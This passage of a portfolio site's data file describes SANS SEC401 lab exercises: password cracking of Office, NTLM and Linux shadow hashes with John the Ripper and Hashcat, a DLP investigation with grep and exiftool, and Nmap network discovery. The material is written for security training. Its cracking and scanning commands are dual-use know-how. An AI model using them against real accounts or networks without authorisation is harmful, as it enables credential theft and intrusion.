      { src: "/labs/vpc-flow-logs-120203.png", alt: "Step 4: Extract attacker flows", caption: "zgrep 20.106.124.93: 33,232 attacker flow records" },
      { src: "/labs/vpc-flow-logs-120457.png", alt: "Step 5: Determine attack timeframe", caption: "Sep 28 2023 5:22 PM - 11:59 PM UTC (~6.5 hours)" },
      { src: "/labs/vpc-flow-logs-120852.png", alt: "Step 6: Quantify data transfer", caption: "Port 8889: 265MB, Port 80: 190MB" },
      { src: "/labs/vpc-flow-logs-121229.png", alt: "Step 7: PCAP to NetFlow conversion", caption: "nfpcapd -r investigate.pcap -w exported-netflow/" },
      { src: "/labs/vpc-flow-logs-121431.png", alt: "Step 8: NetFlow analysis with nfdump", caption: "Structured flow data: Date, Duration, Proto, Src/Dst, Packets, Bytes" },
      { src: "/labs/vpc-flow-logs-121640.png", alt: "Step 9: Attacker HTTP flows", caption: "20.106.124.93:51278 to 10.130.8.94:80 (WordPress brute-force)" },
      { src: "/labs/vpc-flow-logs-121731.png", alt: "Step 10: Attacker SSH flows", caption: "20.106.124.93:38504 to 10.130.8.94:22 (SSH access)" },
      { src: "/labs/vpc-flow-logs-121856.png", alt: "Step 11: Non-standard port 8889", caption: "20.106.124.93:8889 to 10.130.8.94 (data exfiltration)" },
      { src: "/labs/vpc-flow-logs-121944.png", alt: "Step 12: Complete attack surface confirmed", caption: "No traffic beyond ports 80, 22, 8889" },
    ],
  },
  {
    id: 4,
    courseSlug: "sec401",
    slug: "password-auditing",
    title: "Lab 2.1 – Password Auditing",
    course: "SEC401 - Defense in Depth",
    role: "Solo, Lab",
    context:
      "This lab demonstrates password auditing techniques using John the Ripper and Hashcat against multiple hash types: Microsoft Office encryption, NTLM, and Linux SHA-512 crypt. Starting with a CeWL-generated wordlist scraped from a target website, the goal was to crack passwords from an encrypted Excel spreadsheet, an NTLM hash dump, and Linux /etc/shadow files, then use John's word-mangling rules to expand the wordlist and crack stronger passwords that the base wordlist couldn't reach.",
    summary:
      "Cracked passwords across 4 hash types using John the Ripper and Hashcat: extracted and cracked an Office 2013 encrypted Excel file, an NTLM hash, and Linux crypt hashes using a CeWL wordlist. Demonstrated brute-force infeasibility against SHA-512 with Hashcat, then used John's word-mangling rules to expand 1,552 base words into 4M+ candidates to crack passwords the original wordlist missed.",
    whyThisMatters:
      "Password auditing is how organizations discover weak credentials before attackers do. Understanding hash types, choosing the right cracking tool and attack mode, and knowing when brute force is infeasible vs. when a smarter wordlist wins are core skills for penetration testers and security auditors. This lab builds that judgment.",
    focus: "Password Management & Cryptography",
    level: "SEC401",
    date: "Apr 2026",
    artifacts: "Sanitized screenshots from Slingshot Linux lab environment",
    tldr: [
      "Cracked Office 2013, NTLM, and Linux SHA-512 crypt passwords using John the Ripper with a CeWL wordlist",
      "Demonstrated SHA-512 brute-force infeasibility with Hashcat (77-year estimate at 854 H/s)",
      "Expanded 1,552 base words into 4M+ candidates with John's word-mangling rules to crack two remaining passwords",
    ],
    skillsDemonstrated: [
      "Hash extraction (office2john)",
      "John the Ripper wordlist attacks",
      "Hashcat mask attacks",
      "NTLM hash cracking",
      "Linux shadow file analysis",
      "CeWL wordlist reconnaissance",
      "Word-mangling rule expansion",
      "Hash type identification",
    ],
    tools: ["John the Ripper", "Hashcat", "office2john", "unshadow", "CeWL", "LibreOffice", "CLI"],
    steps: [
      "Explored lab files: alphapasswd, alphashadow, bonuspasswd, bonusshadow, cewl-pass.txt, customer-discount.xlsx, ntlm.txt",
      "Identified customer-discount.xlsx as CDFV2 Encrypted, confirmed password-protected via LibreOffice",
      "Examined CeWL wordlist (cewl-pass.txt): 1,552 words scraped from target website",
      "Extracted Office hash with office2john.py: python3 /opt/john/run/office2john.py customer-discount.xlsx > excelhash",
      "Viewed extracted Office 2013 hash structure",
      "Cracked Excel password with John: #AlphaInc! (Office 2007/2010/2013 format, 168 p/s)",
      "Attempted NTLM crack without specifying format: ambiguous hash type warnings (LM vs NT)",
      "Specified --format=NT to crack NTLM hash: #AlphaInc! (19,200 p/s with MD4)",
      "Combined Linux passwd/shadow with unshadow: alphapasswd + alphashadow > alphamerge",
      "Cracked Linux crypt hash with John: #AlphaInc! for alphauser (SHA-512 crypt, 701 p/s)",
      "Attempted Hashcat brute-force on SHA-512 (mode 1800): mask ?u?l?l?l?l?l?l?l?l?d",
      "Hashcat status: 854 H/s, estimated 77 years to complete brute-force",
      "Unshadowed bonus files, attempted CeWL wordlist: 0 passwords cracked",
      "Generated mangled wordlist with John --rules: 1,552 base words expanded to 4,010,859 candidates",
      "Verified rule expansion: 2,156 variants of a single word, 4M+ total candidates",
      "Cracked both bonus passwords with rules-expanded wordlist: #AlphaInc!23 (larry), #AlphaInc!24 (joshua)",
    ],
    stepDetails: [
      {
        title: "Explore lab files",
        description:
          "Listed the lab directory contents: alphapasswd, alphashadow, bonuspasswd, bonusshadow (Linux credential files), cewl-pass.txt (wordlist), customer-discount.xlsx (encrypted spreadsheet), and ntlm.txt (Windows hash). Used the file command to confirm the Excel file was CDFV2 Encrypted.",
        command: "cd /sec401/labs/2.1/ && ls -l\nfile customer-discount.xlsx",
        commandBreakdown: "ls -l: detailed file listing with sizes\nfile: identify file type and encryption status",
        screenshot: "/labs/password-auditing-131636.png",
      },
      {
        title: "Confirm password-protected Excel file",
        description:
          "Opened customer-discount.xlsx with LibreOffice to confirm it requires a password. The dialog prompted for a password to decrypt the file, confirming the Office encryption detected by the file command.",
        screenshot: "/labs/password-auditing-131652.png",
      },
      {
        title: "Examine CeWL wordlist",
        description:
          "Opened cewl-pass.txt in gedit. The wordlist contains 1,552 words scraped from the target organization's website using CeWL (Custom Word List generator). Words include company-specific terms like 'SolarGlow', 'Arctic', and social media references. Organization-specific wordlists are far more effective than generic dictionaries because employees often base passwords on familiar terms.",
        command: "gedit cewl-pass.txt",
        screenshot: "/labs/password-auditing-131755.png",
      },
      {
        title: "Extract Office hash with office2john",
        description:
          "Used office2john.py to extract the password hash from the encrypted Excel file. The script outputs a hash string compatible with John the Ripper. After extraction, ls -l confirms the new excelhash file was created.",
        command: "python3 /opt/john/run/office2john.py customer-discount.xlsx > excelhash",
        commandBreakdown: "office2john.py: extracts password hash from Office documents\n> excelhash: redirect hash to file for cracking",
        screenshot: "/labs/password-auditing-131937.png",
      },
      {
        title: "View extracted Office hash",
        description:
          "Inspected the extracted hash. The format shows $office$*2013*100000*256*16* followed by the hash data. Key fields: Office 2013 format, 100,000 PBKDF2 iterations, 256-bit key length. The high iteration count makes brute-force significantly slower than simpler hash types.",
        command: "cat excelhash",
        screenshot: "/labs/password-auditing-132029.png",
      },
      {
        title: "Crack Excel password with John",
        description:
          "Ran John the Ripper with the CeWL wordlist against the Office hash. John detected Office 2007/2010/2013 format (SHA1 256/256 AVX2 8x / SHA512 256/256 AVX2 4x AES). Cracked the password in under 1 second: #AlphaInc! at 168.4 passwords/second. The low speed reflects the 100,000 PBKDF2 iterations in Office 2013 encryption.",
        command: "john --wordlist=cewl-pass.txt excelhash",
        commandBreakdown: "--wordlist=cewl-pass.txt: use CeWL wordlist\nexcelhash: target hash file",
        screenshot: "/labs/password-auditing-132058.png",
      },
      {
        title: "NTLM hash type ambiguity",
        description:
          "Attempted to crack ntlm.txt without specifying a format. John detected hash type 'LM' but warned it could also match dozens of other formats (NT, MD2, MD4, MD5, mscash, ripemd-128, and many more). This demonstrates why specifying the correct format is critical when the hash is ambiguous.",
        command: "john --wordlist=cewl-pass.txt ntlm.txt",
        screenshot: "/labs/password-auditing-132355.png",
      },
      {
        title: "Crack NTLM hash with correct format",
        description:
          "Specified --format=NT to force NTLM (MD4) interpretation. John loaded 1 password hash and cracked it instantly: #AlphaInc! at 19,200 passwords/second. The dramatic speed difference vs. Office 2013 (19,200 vs. 168 p/s) shows why unsalted, un-iterated hashes like NTLM are trivial to crack.",
        command: "john --wordlist=cewl-pass.txt ntlm.txt --format=NT",
        commandBreakdown: "--format=NT: force NTLM (MD4) hash type\nNT hash = MD4(UTF-16LE(password))",
        screenshot: "/labs/password-auditing-132458.png",
      },
      {
        title: "Combine Linux passwd and shadow files",
        description:
          "Used unshadow to merge alphapasswd and alphashadow into a single file suitable for John. The output shows two users: alphauser (UID 1002, $y$ yescrypt hash) and alpha2 (UID 1003, $6$ SHA-512 crypt hash). Different hash prefixes indicate different algorithms.",
        command: "unshadow alphapasswd alphashadow > alphamerge\ncat alphamerge",
        commandBreakdown: "unshadow: merge /etc/passwd and /etc/shadow into John-compatible format",
        screenshot: "/labs/password-auditing-132610.png",
      },
      {
        title: "Crack Linux crypt hash",
        description:
          "Ran John with --format=crypt against the merged shadow file. Loaded 2 hashes with different salts (algorithms ranging from descrypt to sha512crypt). Cracked alphauser's password: #AlphaInc! at 701.2 candidates/second. The 5,000 SHA-512 iterations make this slower than NTLM but faster than Office 2013.",
        command: "john --format=crypt --wordlist=cewl-pass.txt alphamerge",
        commandBreakdown: "--format=crypt: use generic Unix crypt format\nHandles multiple algorithms (md5crypt, sha256crypt, sha512crypt)",
        screenshot: "/labs/password-auditing-132715.png",
      },
      {
        title: "Hashcat brute-force attempt on SHA-512",
        description:
          "Attempted a brute-force mask attack with Hashcat on the SHA-512 crypt hash. Used mode 1800 (sha512crypt) with attack mode 3 (brute-force) and mask ?u?l?l?l?l?l?l?l?l?d (1 uppercase + 8 lowercase + 1 digit). Hashcat initialized OpenCL on the Intel i7-8750H CPU but hit a token length exception on one hash entry.",
        command: "hashcat -m 1800 -a 3 alphamerge ?u?l?l?l?l?l?l?l?l?d",
        commandBreakdown: "-m 1800: SHA-512 crypt hash mode\n-a 3: brute-force/mask attack\n?u: uppercase letter\n?l: lowercase letter\n?d: digit",
        screenshot: "/labs/password-auditing-132939.png",
      },
      {
        title: "Hashcat status: brute-force infeasible",
        description:
          "Pressed 's' for status. Hashcat reported: SHA-512 (Unix) mode, 854 H/s on the CPU, estimated completion in 77 years 177 days. Progress: 45,024 of 2,088,270,645,760 candidates (0.00%). This demonstrates why brute-force is impractical against properly iterated hashes like SHA-512 crypt, especially without GPU acceleration.",
        screenshot: "/labs/password-auditing-132957.png",
      },
      {
        title: "Bonus challenge: CeWL wordlist fails",
        description:
          "Unshadowed the bonus passwd/shadow files and attempted John with the base CeWL wordlist. Result: 0 passwords cracked. The bonus passwords aren't in the original 1,552-word list, meaning they use variations (appended numbers, mixed case, etc.) that require word-mangling rules to discover.",
        command: "unshadow bonuspasswd bonusshadow > bonus_passwords\njohn --wordlist=cewl-pass.txt bonus_passwords",
        commandBreakdown: "unshadow: merge bonus credential files\n--wordlist: attempt base CeWL wordlist",
        screenshot: "/labs/password-auditing-133202.png",
      },
      {
        title: "Generate mangled wordlist with John rules",
        description:
          "Used John's --rules flag with --stdout to apply word-mangling transformations (case toggling, number appending, character substitution, etc.) to every word in the CeWL list, redirecting all generated candidates to cewl-rules.txt. This massively expands the effective wordlist without manual effort.",
        command: "john --wordlist=cewl-pass.txt --rules --stdout > cewl-rules.txt",
        commandBreakdown: "--rules: enable default word-mangling rules\n--stdout: output candidates instead of cracking\n> cewl-rules.txt: save expanded wordlist",
        screenshot: "/labs/password-auditing-133315.png",
      },
      {
        title: "Verify rule expansion scale",
        description:
          "Compared wordlist sizes: the base cewl-pass.txt had 1,552 lines. After rule expansion, cewl-rules.txt had 4,010,859 lines, a 2,585x increase. Grep confirmed 2,156 variants generated from a single word ('merely'). This shows how rules systematically cover common password mutation patterns.",
        command: "wc -l cewl-pass.txt\nwc -l cewl-rules.txt\ngrep merely cewl-rules.txt | wc -l",
        commandBreakdown: "wc -l: count lines (candidates)\ngrep | wc -l: count variants of a specific word",
        screenshot: "/labs/password-auditing-133535.png",
      },
      {
        title: "Crack bonus passwords with expanded wordlist",
        description:
          "Ran John with the rules-expanded wordlist against the bonus hashes. Both passwords cracked in 36 seconds: #AlphaInc!23 (larry) and #AlphaInc!24 (joshua). The base word '#AlphaInc!' was in the original CeWL list, but the appended numbers '23' and '24' required rule-generated variants. This demonstrates why word-mangling rules are essential for real-world password auditing.",
        command: "john --wordlist=cewl-rules.txt bonus_passwords",
        commandBreakdown: "--wordlist=cewl-rules.txt: use rules-expanded 4M-candidate wordlist",
        screenshot: "/labs/password-auditing-133647.png",
      },
    ],
    outcome:
      "This lab covered the full password auditing workflow: identifying hash types, choosing the right tool and attack mode, and understanding when to switch from brute force to smarter wordlist techniques. The key takeaway was the contrast between hash strengths: NTLM cracked at 19,200 p/s while SHA-512 crypt managed only 854 H/s under brute force, making it computationally infeasible without a targeted wordlist. The CeWL-to-rules pipeline proved that organization-specific wordlists combined with systematic word-mangling rules can crack passwords that resist both dictionary and brute-force attacks.",
    nextStepsInProduction:
      "If this were a real engagement: I'd report all cracked credentials to the organization with remediation timelines, recommend enforcing minimum 16-character passphrases and banning company-name-based passwords, check for credential reuse across systems, verify that NTLM authentication is disabled where possible in favor of Kerberos, and recommend migrating from SHA-512 crypt to bcrypt or argon2 with higher work factors.",
    securityControlsRelevant: [
      "Enforce strong password policies (length > complexity)",
      "Ban organization-specific words in passwords (Azure AD Custom Banned Passwords)",
      "Disable NTLM authentication where possible",
      "Use modern hash algorithms (bcrypt, argon2) with high work factors",
      "Regular password auditing with internal red team tools",
      "MFA on all accounts to reduce credential-only attack impact",
    ],
    keyFindings: [
      "Office 2013: #AlphaInc! cracked at 168 p/s (100K PBKDF2 iterations)",
      "NTLM: #AlphaInc! cracked at 19,200 p/s (unsalted MD4, trivially fast)",
      "Linux SHA-512 crypt: #AlphaInc! cracked at 701 p/s (5,000 iterations)",
      "Hashcat brute-force on SHA-512: 854 H/s, 77-year estimated completion",
      "CeWL wordlist: 1,552 words expanded to 4,010,859 with John's mangling rules",
      "Bonus passwords (#AlphaInc!23, #AlphaInc!24) required rule-expanded wordlist to crack",
    ],
    takeaway: [
      "The speed difference between hash types is the real lesson here, not the cracking itself. NTLM at 19,200 p/s vs. SHA-512 crypt at 854 H/s vs. Office 2013 at 168 p/s tells you everything about why hash algorithm choice matters more than password policy. An organization can mandate 16-character passwords, but if Active Directory is still storing NTLM hashes (and it is, by default), an attacker with a domain dump will crack most of them in hours. The first recommendation in any password audit should be 'disable NTLM where possible,' not 'require longer passwords.'",
      "CeWL is underrated in real engagements. Generic wordlists like rockyou.txt contain millions of entries but miss the most likely passwords: the ones employees create from what they see every day. The company name, product names, office locations, slogans from the website. In this lab, every single password was a variation of '#AlphaInc!' which is literally the organization's name with common substitutions. Azure AD and Entra ID have Custom Banned Password Lists that can block these, but I've rarely seen organizations configure them. It's a 10-minute fix that would have stopped every crack in this lab.",
      "The brute-force attempt with Hashcat was the most instructive failure. 77 years at 854 H/s on a single CPU. Even with GPU acceleration pushing that to 500K H/s, a 10-character password with mixed character classes would still take months against SHA-512 crypt. This is why password complexity requirements exist for older hash algorithms, but also why the industry is moving toward bcrypt and argon2 with configurable work factors. The right answer isn't 'make passwords longer,' it's 'make hashing slower.' A properly configured argon2 hash turns even a weak password into a computationally expensive target.",
    ],
    screenshots: [
      { src: "/labs/password-auditing-131636.png", alt: "Step 1: Explore lab files", caption: "Lab directory: passwd/shadow files, CeWL wordlist, encrypted Excel, NTLM hash" },
      { src: "/labs/password-auditing-131652.png", alt: "Step 2: Password-protected Excel", caption: "LibreOffice prompts for password to open customer-discount.xlsx" },
      { src: "/labs/password-auditing-131755.png", alt: "Step 3: CeWL wordlist", caption: "1,552 organization-specific words scraped from target website" },
      { src: "/labs/password-auditing-131937.png", alt: "Step 4: Extract Office hash", caption: "office2john.py customer-discount.xlsx > excelhash" },
      { src: "/labs/password-auditing-132029.png", alt: "Step 5: Office 2013 hash structure", caption: "$office$*2013*100000*256*16* (100K PBKDF2 iterations)" },
      { src: "/labs/password-auditing-132058.png", alt: "Step 6: Crack Excel password", caption: "John + CeWL wordlist: #AlphaInc! at 168 p/s" },
      { src: "/labs/password-auditing-132355.png", alt: "Step 7: NTLM hash type ambiguity", caption: "John warns: LM detected but dozens of formats match" },
      { src: "/labs/password-auditing-132458.png", alt: "Step 8: Crack NTLM with --format=NT", caption: "#AlphaInc! at 19,200 p/s (MD4, no salt, no iterations)" },
      { src: "/labs/password-auditing-132610.png", alt: "Step 9: unshadow Linux credentials", caption: "Merged alphapasswd + alphashadow: yescrypt and SHA-512 hashes" },
      { src: "/labs/password-auditing-132715.png", alt: "Step 10: Crack Linux crypt hash", caption: "John --format=crypt: #AlphaInc! for alphauser at 701 p/s" },
      { src: "/labs/password-auditing-132939.png", alt: "Step 11: Hashcat brute-force attempt", caption: "hashcat -m 1800 -a 3: SHA-512 mask attack with OpenCL" },
      { src: "/labs/password-auditing-132957.png", alt: "Step 12: Brute-force infeasible", caption: "854 H/s, estimated 77 years for SHA-512 crypt" },
      { src: "/labs/password-auditing-133202.png", alt: "Step 13: CeWL wordlist fails on bonus", caption: "0 passwords cracked with base 1,552-word list" },
      { src: "/labs/password-auditing-133315.png", alt: "Step 14: Generate mangled wordlist", caption: "john --rules --stdout: systematic word transformations" },
      { src: "/labs/password-auditing-133535.png", alt: "Step 15: Rule expansion scale", caption: "1,552 words expanded to 4,010,859 candidates (2,585x)" },
      { src: "/labs/password-auditing-133647.png", alt: "Step 16: Crack bonus passwords", caption: "#AlphaInc!23 (larry), #AlphaInc!24 (joshua) in 36 seconds" },
    ],
  },
  {
    id: 5,
    courseSlug: "sec401",
    slug: "data-loss-prevention",
    title: "Lab 2.2 - Data Loss Prevention",
    course: "SEC401 - Defense in Depth",
    role: "Solo, Lab",
    context:
      "This lab simulates a data loss prevention investigation on a removable media device (CDROM). The goal was to identify sensitive files using keyword scanning with grep, extract hidden metadata from Office documents using exiftool, and geolocate the origin of a photograph by extracting GPS coordinates embedded in its EXIF data.",
    summary:
      "Scanned removable media for sensitive content using grep keyword matching, extracted document metadata with exiftool revealing author identity and SECRET classification, and geolocated a photo's origin from embedded GPS coordinates.",
    whyThisMatters:
      "Data exfiltration via removable media remains one of the most common insider threat vectors. Organizations that don't scan outbound media miss classified documents walking out the door. Metadata in Office files and photos can reveal authorship, classification markings, and even physical locations that the sender never intended to share. DLP tools automate what this lab does manually, but understanding the underlying techniques is essential for tuning DLP policies and investigating incidents.",
    focus: "Data Security & DLP",
    level: "SEC401",
    date: "Apr 2026",
    artifacts: "Sanitized screenshots from Slingshot Linux lab environment",
    tldr: [
      "Used grep with regex to scan removable media and flag files containing 'secret', 'confidential', or 'sensitive'",
      "Extracted Office document metadata with exiftool: author, classification keyword (SECRET), and modification history",
      "Geolocated a photograph by extracting GPS coordinates from EXIF data and identifying the real-world location",
    ],
    skillsDemonstrated: [
      "DLP keyword scanning with grep",
      "Regex-based content classification",
      "Document metadata extraction (exiftool)",
      "EXIF GPS coordinate extraction",
      "Geolocation from image metadata",
      "Insider threat investigation",
      "Removable media forensics",
    ],
    tools: ["grep", "exiftool", "EXIF/GPS analysis", "CLI"],
    steps: [
      "Navigated to removable media mount: cd /media/sec401/CDROM/",
      "Scanned all files for sensitive keywords: grep -Pail '(secret|confidential|sensitive)' *",
      "Identified flagged file: Merger Offer Letter to Beta Industries.doc",
      "Extracted full metadata from Bankruptcy.docx with exiftool",
      "Identified metadata: Creator (Madison Jeffries), Keywords (SECRET), Last Modified By (Jerry Jackson)",
      "Opened image file and examined EXIF properties for embedded GPS coordinates",
      "Extracted GPS latitude and longitude from image metadata",
      "Converted GPS coordinates to identify the real-world location of the photograph",
    ],
    stepDetails: [
      {
        title: "Scan removable media for sensitive keywords",
        description:
          "Navigated to the mounted CDROM and used grep with Perl-compatible regex to scan all files for the words 'secret', 'confidential', or 'sensitive'. The -P flag enables PCRE, -a treats binary files as text, -i makes the search case-insensitive, and -l prints only filenames (not matching lines). One file matched: 'Merger Offer Letter to Beta Industries.doc', a document that would be flagged by any DLP system scanning for classification markers.",
        command: "cd /media/sec401/CDROM/\ngrep -Pail '(secret|confidential|sensitive)' *",
        commandBreakdown: "-P: Perl-compatible regex (supports alternation with |)\n-a: treat binary files as text (needed for .doc/.docx)\n-i: case-insensitive matching\n-l: print only filenames, not matching content",
        screenshot: "/labs/dlp-191215.png",
      },
      {
        title: "Extract document metadata with exiftool",
        description:
          "Ran exiftool against Bankruptcy.docx to extract all embedded metadata. Key findings: the document was created by Madison Jeffries, last modified by Jerry Jackson, and tagged with the keyword SECRET. Additional metadata reveals it was created in Microsoft Office Word (App Version 16.0000), has 358 words across 2 pages, and has a total edit time of 2,982,555 days. The Keywords field is particularly significant for DLP: this is where classification markings like SECRET, CONFIDENTIAL, or TOP SECRET are often stored in government and corporate environments.",
        command: "exiftool Bankruptcy.docx",
        commandBreakdown: "exiftool: read/write metadata in files (EXIF, IPTC, XMP, Office XML)\nOutputs all metadata fields including Creator, Keywords, Last Modified By",
        screenshot: "/labs/dlp-191858.png",
      },
      {
        title: "Geolocate photo from GPS coordinates",
        description:
          "Opened an image file and examined its EXIF properties, which revealed embedded GPS coordinates (GPSLatitude and GPSLongitude). Photographs taken with smartphones and GPS-enabled cameras automatically embed location data in the image file. By extracting these coordinates, the exact location where the photo was taken can be identified on a map. This is a major privacy and security concern: employees sharing photos from sensitive facilities, whistleblowers inadvertently revealing their location, or insiders documenting assets before exfiltration. DLP policies should strip EXIF data from outbound images or flag files containing GPS metadata.",
        screenshot: "/labs/dlp-192019.png",
      },
    ],
    outcome:
      "This lab demonstrated three core DLP investigation techniques: keyword scanning to identify sensitive content in files, metadata extraction to reveal document authorship and classification markings, and GPS coordinate extraction to geolocate the origin of photographs. The combination of grep for content inspection and exiftool for metadata analysis represents the manual equivalent of what enterprise DLP solutions automate at scale.",
    nextStepsInProduction:
      "If this were a real investigation: I'd correlate the document author (Madison Jeffries) and modifier (Jerry Jackson) with HR and access control records, escalate the SECRET-classified document found on removable media as a potential data spillage incident, implement DLP policies to scan removable media before data can be written to it, configure endpoint agents to strip EXIF/GPS data from outbound images, and review access logs to determine how classified documents reached the CDROM.",
    securityControlsRelevant: [
      "DLP policies scanning removable media for classification keywords",
      "Endpoint controls restricting USB/CDROM write access",
      "EXIF/GPS metadata stripping on outbound files",
      "Document classification enforcement (mandatory marking)",
      "Insider threat monitoring and behavioral analytics",
      "Data-at-rest scanning for misplaced classified documents",
    ],
    keyFindings: [
      "grep -Pail flagged 'Merger Offer Letter to Beta Industries.doc' containing sensitive keywords",
      "exiftool revealed Bankruptcy.docx: Creator (Madison Jeffries), Keywords (SECRET), Last Modified By (Jerry Jackson)",
      "Image EXIF data contained embedded GPS coordinates revealing the photo's geographic origin",
      "All three data leakage vectors (content, metadata, geolocation) found on a single removable device",
    ],
    takeaway: [
      "The grep scan is the simplest possible DLP check, and it's shocking how effective it is. A one-liner with three keywords caught a merger offer letter sitting on a CDROM. In a real organization, an insider copying M&A documents to removable media is a textbook exfiltration scenario. The SEC has prosecuted cases exactly like this. Enterprise DLP tools like Microsoft Purview, Symantec DLP, and Digital Guardian do the same thing at scale, scanning content against hundreds of classification patterns, but the underlying technique is identical: regex matching against file content. If you understand what grep -Pail does, you understand the detection engine behind a $500K DLP deployment.",
      "The exiftool output is where this gets interesting from an investigation standpoint. The Keywords field reads SECRET, which means someone explicitly classified this document and it still ended up on removable media. That's not an accidental leak; it's a control failure. The Creator and Last Modified By fields give you two names to investigate: Madison Jeffries authored it, Jerry Jackson edited it last. In a real incident response, you'd cross-reference these names against access control lists, check who had physical access to the CD burner, and pull endpoint logs to trace the chain of custody. Metadata is the forensic breadcrumb trail that most insiders forget to clean.",
      "The GPS coordinates in the image EXIF data are the most underestimated risk on this disc. Every smartphone photo embeds latitude and longitude by default unless the user explicitly disables location services. Military and intelligence organizations have standing orders to strip EXIF data before sharing any imagery, and there are documented cases where embedded GPS coordinates revealed the locations of forward operating bases. In a corporate context, a photo taken inside a data center, a lab, or a competitor's facility carries the same risk. The fix is straightforward: DLP policies should flag or strip GPS metadata from outbound files, and security awareness training should cover the risk of location-tagged photos. Most employees have no idea their phone is embedding a precise map coordinate in every picture they take.",
    ],
    screenshots: [
      { src: "/labs/dlp-191215.png", alt: "Step 1: Grep keyword scan", caption: "grep -Pail flags 'Merger Offer Letter to Beta Industries.doc' on CDROM" },
      { src: "/labs/dlp-191858.png", alt: "Step 2: exiftool metadata extraction", caption: "Bankruptcy.docx: Creator (Madison Jeffries), Keywords (SECRET), Modified By (Jerry Jackson)" },
      { src: "/labs/dlp-192019.png", alt: "Step 3: GPS coordinate extraction", caption: "Image EXIF properties reveal embedded GPS latitude and longitude" },
    ],
  },
  {
    id: 7,
    courseSlug: "sec401",
    slug: "network-discovery",
    title: "Lab 3.1 - Network Discovery",
    course: "SEC401 - Vulnerability Management and Response",
    role: "Solo, Lab",
    focus: "Network Security",
    level: "SEC401",
    date: "Apr 2026",
    artifacts: "Sanitized screenshots of Nmap scans, ndiff baseline comparison, post-discovery SSH and iptables review",
    tldr: [
      "Enumerated a /24 lab network with Nmap ping, port, version, and OS scans",
      "Baselined results to XML and used ndiff to detect a new service between scans",
      "Pivoted to a discovered host to review netstat, iptables rules, and served content",
    ],
    skillsDemonstrated: [
      "Host discovery with Nmap -sn",
      "Service and version enumeration (-sV)",
      "OS fingerprinting (-O, --osscan-guess)",
      "XML output and ndiff baseline comparison",
      "Post-scan host triage (netstat, iptables, curl)",
      "Recognizing non-standard service ports",
    ],
    context:
      "This lab demonstrates a full network discovery workflow against a lab environment of seven Docker containers on 172.28.14.0/24, then pivots to one of the discovered hosts to validate what the scan found at the OS and firewall layer.",
    summary:
      "Ran Nmap against a /24 lab network: identified 7 live hosts, enumerated services (OpenSSH, MySQL, nginx, php-fpm), attempted OS fingerprinting, baselined results to XML, and used ndiff to catch a newly exposed Python WSGI server on port 8000. Confirmed the finding by SSHing in and reviewing netstat, iptables, and the served page.",
    whyThisMatters:
      "Network discovery is the first step of almost every attack and almost every defensive asset inventory. Knowing how to surface live hosts, services, and changes between scans is the difference between an asset inventory that reflects reality and a spreadsheet that went stale six months ago.",
    tools: ["Nmap", "ndiff", "ssh", "netstat", "iptables", "curl"],
    steps: [
      "Started lab environment: ./start_3.1.sh (7 containers up)",
      "Ping scan: nmap -sn 172.28.14.0/24 (7 hosts up)",
      "Top-100 / fast port sweeps with greppable output",
      "Service/version detection: nmap -sV 172.28.14.0/24",
      "OS detection: nmap -O and nmap -O --osscan-guess",
      "Second version scan written to XML: nmap -sV -oX new_network.xml",
      "ndiff network.xml new_network.xml (new 8000/tcp WSGIServer on docs host)",
      "SSH into docs host on non-standard port: ssh -p 80 root@172.28.14.23",
      "netstat -anp on target to confirm listening sockets",
      "iptables -n -L on target to see firewall rules for port 8000",
      "curl localhost:8000 to retrieve the Alpha Developers mkdocs site",
    ],
    stepDetails: [
      {
        title: "Lab environment startup",
        description:
          "Launched the lab stack from /sec401/labs/3.1. The start script brought up seven Docker containers: webapp, docs, database, old-database, php-fpm, php-nginx, and a student container used as the scanning host.",
        command: "cd /sec401/labs/3.1/ && ./start_3.1.sh",
        screenshot: "/labs/network-discovery-143816.png",
      },
      {
        title: "Ping sweep: discover live hosts",
        description:
          "Ran a host-discovery-only scan against the /24. Nmap reported 7 hosts up in 1.38 seconds, each with a 172.28.14.x address, matching the containers launched by the start script.",
        command: "nmap -sn 172.28.14.0/24",
        commandBreakdown: "-sn: ping scan, no port scan\n172.28.14.0/24: 256-address lab subnet",
        screenshot: "/labs/network-discovery-144231.png",
      },
      {
        title: "Greppable port sweeps",
        description:
          "Demonstrated two greppable-output scans: --top-ports 100 and the -F fast scan. Both ran against the default target (none supplied on the CLI), so they returned zero hosts. The point was to capture the exact port list each scan covers in the header comment for documentation.",
        command: "nmap -v --top-ports 100 -oG -\nnmap -v -F -oG -",
        commandBreakdown: "-v: verbose\n--top-ports 100: scan the 100 most common TCP ports\n-F: fast scan (~top 100 from nmap-services)\n-oG -: greppable output to stdout",
        screenshot: "/labs/network-discovery-144327.png",
      },
      {
        title: "Service and version detection",
        description:
          "Enumerated services on every live host: OpenSSH 8.9p1 on the docs host, MySQL 5.7.41/5.7.44 on the two database hosts, nginx 1.14.2 on php-nginx, an unknown cslistener on php-fpm:9000, and http/https on the webapp. CPE entries (cpe:/o:linux:linux_kernel) confirm a Linux target fleet.",
        command: "nmap -sV 172.28.14.0/24",
        commandBreakdown: "-sV: probe open ports for service/version info",
        screenshot: "/labs/network-discovery-144751.png",
      },
      {
        title: "OS detection: strict match",
        description:
          "Ran a strict OS fingerprint. Nmap collected a full TCP/IP signature for each host but reported 'No exact OS matches' because containers don't present a clean kernel fingerprint over the network.",
        command: "nmap -O 172.28.14.0/24",
        commandBreakdown: "-O: OS fingerprinting based on TCP/IP stack behavior",
        screenshot: "/labs/network-discovery-144947.png",
      },
      {
        title: "OS detection: aggressive guess",
        description:
          "Re-ran with --osscan-guess. Nmap returned probability-weighted matches: Linux 2.6.32 (96%), Linux 3.2-4.9 (96%), with odd long-tail guesses like AXIS 210A network camera and Synology DiskStation. Useful reminder that OS detection degrades badly against virtualized or containerized hosts.",
        command: "nmap -O --osscan-guess 172.28.14.0/24",
        commandBreakdown: "--osscan-guess: print closest matches even when no exact match",
        screenshot: "/labs/network-discovery-145219.png",
      },
      {
        title: "Baseline scan saved to XML",
        description:
          "Saved a second version scan to new_network.xml. XML output is the format ndiff consumes and the format most asset-management pipelines ingest.",
        command: "nmap -sV -oX new_network.xml 172.28.14.0/24",
        commandBreakdown: "-oX: XML output file",
        screenshot: "/labs/network-discovery-145528.png",
      },
      {
        title: "ndiff: detect scan-over-scan change",
        description:
          "Compared an older baseline (network.xml, Nov 2023) to new_network.xml (Apr 2026). ndiff surfaced a new listener on the docs host: 8000/tcp open http WSGIServer 0.2 (Python 3.10.12). This is the exact signal an asset inventory wants, a service that wasn't there before, on a host you thought you understood.",
        command: "ndiff network.xml new_network.xml",
